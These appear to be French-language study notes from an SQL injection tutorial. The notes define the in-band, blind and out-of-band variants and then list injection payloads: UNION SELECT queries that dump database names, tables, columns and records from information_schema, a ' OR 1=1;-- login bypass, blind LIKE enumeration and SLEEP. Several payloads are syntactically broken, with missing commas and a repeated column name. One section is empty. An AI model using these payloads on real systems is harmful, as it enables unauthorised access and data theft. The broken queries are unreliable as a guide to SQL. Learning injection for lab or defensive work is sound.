# Injections SQL

## Qu'est-ce que les injections SQL ?
Ce sont des injections de code SQL à travers les données fournies par l'utilisateur.
## Qu'est-ce que le "In-Band SQLi" ?
C'est une méthode qui utilise le vulnérabilité pour récuperer toutes les informations de la base de données. 
## Qu'est-ce que le "Blind SQLi - Authentication Bypass" ?
C'est une tchnique utilisée pour contourner les systèmes d'authentification mais les resultats d'injections ne sont pas affichés à l'écran.
## Qu'est-ce que le "Blind SQLi - Boolean Based" ?
C'est une méthode qui utilise les réponses (2 posibilités true or false) que nous obtenons de nos injections SQL. 
## Qu'est-ce que le "Blind SQLi - Time Based" ?
Basée sur le temps, cette méthode utilise le temps mis lors l'exécution des inections SQL, sans pause signifie échec et pause signifie réussite.
## Qu'est-ce que le "Out-of-Band SQLi" ?

## Commandes
### Récupérer le nom de la base de données

```
UNION SELECT 1,2,3 database()
```

### Récupérer la liste des tables d'une base de données

```
 UNION SELECT * group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'BD_NAME'
```

### Récupérer la liste des colonnes d'une table

```
UNION SELECT * group_concat(column_name) FROM information_schema.columns WHERE table_name = 'TBL_NAME'
```

### Récupérer les valeurs des enregistrements d'une table

```
UNION SELECT 1,2,3 group_concat(COLONNE1,';',COLONNE1 SEPARATOR '
') FROM TBL_NAME
```

### By pass un formulaire de connexion

```
insérer ' OR 1=1;-- dans le champ mot de passe
```

### Trouver une table dans une base de données connue par essaie et erreur

```
UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'bdName' and table_name like 'a%';--
```

### Trouver les colonnes d'une table connue par essaie et erreur

```
UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='bdName' and TABLE_NAME='tblName' and COLUMN_NAME like 'a%';
```

### Trouver un champ par essaie et erreur

```
UNION SELECT 1,2,3 from tblName where champ like 'a%
```

### Ajouter un sleep dans une requête.

```
SLEEP(time)
```

### Preuve que vous avez terminé le tutoriel :
